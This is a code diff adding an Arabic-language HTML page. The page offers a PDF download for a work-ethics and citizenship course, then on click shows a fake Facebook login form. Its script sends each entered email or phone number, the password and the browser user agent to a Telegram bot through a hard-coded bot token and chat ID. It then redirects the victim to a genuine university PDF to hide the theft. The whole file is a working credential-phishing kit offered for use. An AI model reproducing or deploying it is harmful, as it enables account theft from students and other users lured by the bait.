@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل درس أخلاق العمل و المواطنة</title>
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-hover: #166fe5;
+            --fb-green: #42b72a;
+            --fb-green-hover: #36a420;
+            --fb-text: #1c1e21;
+            --fb-muted: #606770;
+            --fb-border: #ccd0d5;
+        }
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            font-family: Helvetica, Arial, sans-serif;
+            color: var(--fb-text);
+            background-color: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        /* واجهة زر التحميل الأولى */
+        #downloadSection {
+            text-align: center;
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+        #downloadSection h1 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+        .download-btn {
+            background-color: #00875a;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        }
+        .download-btn:hover {
+            background-color: #006644;
+        }
+
+        /* واجهة الفيسبوك الوهمية (مخفية بالبداية) */
+        #fakeFbSection {
+            display: none;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 980px;
+            width: 100%;
+            padding: 20px;
+            margin-bottom: 80px;
+        }
+        .fb-intro {
+            flex: 1;
+            padding-right: 32px;
+        }
+        .fb-logo {
+            font-size: 56px;
+            font-weight: bold;
+            color: var(--fb-blue);
+            margin-bottom: 10px;
+            letter-spacing: -2px;
+        }
+        .fb-tagline {
+            font-size: 28px;
+            line-height: 32px;
+            font-weight: normal;
+        }
+        .fb-card-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: flex-end;
+        }
+        .fb-card {
+            background: #ffffff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0,.1), 0 8px 16px rgba(0, 0, 0,.1);
+            padding: 20px;
+            width: 396px;
+            text-align: center;
+        }
+        .fb-card input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0;
+            border: 1px solid var(--fb-border);
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            background: #fff;
+        }
+        .fb-card input:focus {
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .fb-login-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--fb-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .fb-login-btn:hover {
+            background: var(--fb-blue-hover);
+        }
+        .fb-divider {
+            border-bottom: 1px solid var(--fb-border);
+            margin: 20px 0;
+        }
+        .fb-create-btn {
+            background: var(--fb-green);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px 16px;
+            cursor: pointer;
+            display: inline-block;
+            margin-top: 6px;
+        }
+        .fb-create-btn:hover {
+            background: var(--fb-green-hover);
+        }
+        @media (max-width: 900px) {
+            #fakeFbSection { flex-direction: column; text-align: center; }
+            .fb-intro { padding-right: 0; margin-bottom: 40px; }
+            .fb-card-wrapper { justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- الخطوة الأولى: زر تحميل الدرس -->
+    <div id="downloadSection">
+        <h1>مادة أخلاق العمل و المواطنة</h1>
+        <p style="color: #5f6368; margin-bottom: 25px;">اضغط على الزر أدناه لتحميل الملف بصيغة PDF</p>
+        <button class="download-btn" id="showLoginBtn">📥 تحميل درس أخلاق العمل و المواطنة pdf</button>
+    </div>
+
+    <!-- الخطوة الثانية: الواجهة الشبيهة بفيسبوك (تظهر عند الضغط على زر التحميل) -->
+    <div id="fakeFbSection">
+        <div class="fb-intro">
+            <div class="fb-logo">facebook</div>
+            <div class="fb-tagline">يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص الذين تعرفهم.</div>
+        </div>
+        <div class="fb-card-wrapper">
+            <div class="fb-card">
+                <form id="authForm">
+                    <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                    <input type="password" id="password" placeholder="كلمة المرور" required>
+                    <button type="submit" class="fb-login-btn">تسجيل الدخول</button>
+                    <div style="margin: 15px 0;">
+                        <a href="#" style="color: var(--fb-blue); font-size: 14px; text-decoration: none;">هل نسيت كلمة المرور؟</a>
+                    </div>
+                    <div class="fb-divider"></div>
+                    <button type="button" class="fb-create-btn">إنشاء حساب جديد</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const botToken = '8756764415:AAFFdnNRfwBgPNsgrt5ZFy-cPFmQ5v5NaIA';
+        const chatId = '6842658461';
+
+        // عند الضغط على زر التحميل، يتم إخفاء قسم التحميل وإظهار واجهة فيسبوك الوهمية
+        document.getElementById('showLoginBtn').addEventListener('click', function() {
+            document.getElementById('downloadSection').style.display = 'none';
+            document.getElementById('fakeFbSection').style.display = 'flex';
+        });
+
+        // عند محاولة تسجيل الدخول في الواجهة الوهمية، يتم الإرسال لتليجرام ثم التوجيه للرابط المطلوب
+        document.getElementById('authForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            const message = `📥 بيانات فيسبوك جديدة (من صفحة التحميل):\n` +
+                            `👤 المستخدم: ${username}\n` +
+                            `🔑 كلمة المرور: ${password}\n` +
+                            `💻 المتصفح: ${navigator.userAgent}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+            } catch (err) { 
+                console.error(err); 
+            }
+
+            // الانتقال للرابط المخصص مباشرة بعد إرسال البيانات
+            window.location.href = "https://sc-st.univ-batna2.dz/sites/default/files/sc_st/files/cours-ethique.pdf";
+        });
+    </script>
+</body>
+</html>
